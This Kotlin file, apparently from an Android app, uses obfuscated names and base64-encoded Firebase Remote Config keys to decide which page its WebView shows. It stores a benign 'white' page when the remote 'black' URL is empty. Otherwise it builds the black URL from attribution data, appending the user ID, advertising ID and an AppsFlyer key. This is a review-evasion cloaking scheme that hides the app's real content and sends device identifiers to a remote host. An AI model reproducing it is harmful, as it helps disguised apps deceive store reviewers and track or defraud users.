package com.oka.room.jooka.com

import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.util.Base64
import android.webkit.ValueCallback
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await


var filePathCallback56ji5: ValueCallback<Array<Uri>>? = null
var uriView56ji5 = Uri.EMPTY
var isDismissed56ji5 = true

fun String.decodeBase6456ji5() = String(Base64.decode(this, Base64.DEFAULT))

fun setupFireBase56ji5() {
    CoroutineScope(Dispatchers.IO).launch {
        Firebase.remoteConfig.let { remoteConfig56ji5 ->
            remoteConfig56ji5.setConfigSettingsAsync(
                remoteConfigSettings {
                    minimumFetchIntervalInSeconds = 1000
                }
            ).await()
            remoteConfig56ji5.setDefaultsAsync(
                mapOf(
                    FIREBASE_BLACK_KEY_CODED_56JI5.decodeBase6456ji5() to EMPTY_TAG_56ji5
                )
            ).await()
            remoteConfig56ji5.fetchAndActivate().addOnCompleteListener { task56ji5 ->
                if (task56ji5.isSuccessful) {
                    fbBlack56ji5 =
                        remoteConfig56ji5.getString(FIREBASE_BLACK_KEY_CODED_56JI5.decodeBase6456ji5())
                    fbDef56ji5 =
                        remoteConfig56ji5.getString(FIREBASE_DEFAULT_KEY_CODED_56JI5.decodeBase6456ji5())
                    fbWhite56ji5 =
                        remoteConfig56ji5.getString(FIREBASE_WHITE_KEY_CODED_56JI5.decodeBase6456ji5())
                }
            }
        }
    }
}

fun SharedPreferences.setUpLink56ji5() {
    if (fbBlack56ji5 == null || fbBlack56ji5 == EMPTY_TAG_56ji5) {
        putFirstPage56ji5(fbWhite56ji5)
    } else {
        if (status56ji5 == "Non-organic") {
            if (key56ji5.toString().length != 20) {
                putFirstPage56ji5(Uri.parse(fbBlack56ji5).buildUpon()
                    .appendQueryParameter(KEY_TAG_56ji5, fbDef56ji5)
                    .appendQueryParameter(BUNDLE_TAG_56ji5, bundle56ji5)
                    .appendQueryParameter(SUB4_TAG_56ji5, sub456ji5)
                    .appendQueryParameter(SUB5_TAG_56ji5, sub556ji5)
                    .appendQueryParameter(SUB6_TAG_56ji5, sub656ji5)
                    .appendQueryParameter(SUB7_TAG_56ji5, DEFAULT_TAG_56ji5)
                    .toString()
                    .plus("&$SUB10_TAG_56ji5=$uid56ji5||$gaid56ji5||${APPS_FLYER_KEY_CODED_56JI5.decodeBase6456ji5()}"))
            } else {
                putFirstPage56ji5(Uri.parse(fbBlack56ji5).buildUpon()
                        .appendQueryParameter(KEY_TAG_56ji5, key56ji5)
                        .appendQueryParameter(BUNDLE_TAG_56ji5, bundle56ji5)
                        .appendQueryParameter(SUB2_TAG_56ji5, sub256ji5)
                        .appendQueryParameter(SUB3_TAG_56ji5, sub356ji5)
                        .appendQueryParameter(SUB4_TAG_56ji5, sub456ji5)
                        .appendQueryParameter(SUB5_TAG_56ji5, sub556ji5)
                        .appendQueryParameter(SUB6_TAG_56ji5, sub656ji5)
                        .appendQueryParameter(SUB7_TAG_56ji5, sub756ji5)
                        .toString()
                        .plus("&$SUB10_TAG_56ji5=$uid56ji5||$gaid56ji5||${APPS_FLYER_KEY_CODED_56JI5.decodeBase6456ji5()}"))
            }
        } else {
            putFirstPage56ji5(Uri.parse(fbBlack56ji5).buildUpon()
                    .appendQueryParameter(KEY_TAG_56ji5, fbDef56ji5)
                    .appendQueryParameter(SUB7_TAG_56ji5, ORGANIC_TAG_56ji5)
                    .toString()
                    .plus("&$SUB10_TAG_56ji5=$uid56ji5||$gaid56ji5||${APPS_FLYER_KEY_CODED_56JI5.decodeBase6456ji5()}"))
        }
    }
}

fun SharedPreferences.getLastPage56ji5() = getString(LAST_PAGE_56ji5, null)

fun SharedPreferences.putLastPage56ji5 (str56ji5 : String?) = edit().putString(LAST_PAGE_56ji5, str56ji5).apply()

fun SharedPreferences.putFirstPage56ji5 (str56ji5 : String?) = edit().putString(FIRST_PAGE_56ji5, str56ji5).apply()

fun SharedPreferences.getFirstPage56ji5 () = getString(FIRST_PAGE_56ji5, null)


fun returnFileToWebView (request56ji5: Int, result56ji5: Int, data56ji5: Intent?) {
    if (request56ji5 == REQUEST_CODE_56ji5) {
        val uriResult56ike33 =
            if (data56ji5 == null || result56ji5 != AppCompatActivity.RESULT_OK) null else data56ji5.data
        if (uriResult56ike33 != null) {
            filePathCallback56ji5?.onReceiveValue(arrayOf(uriResult56ike33))
        } else {
            filePathCallback56ji5?.onReceiveValue(arrayOf(uriView56ji5))
        }
        filePathCallback56ji5 = null
    }
}



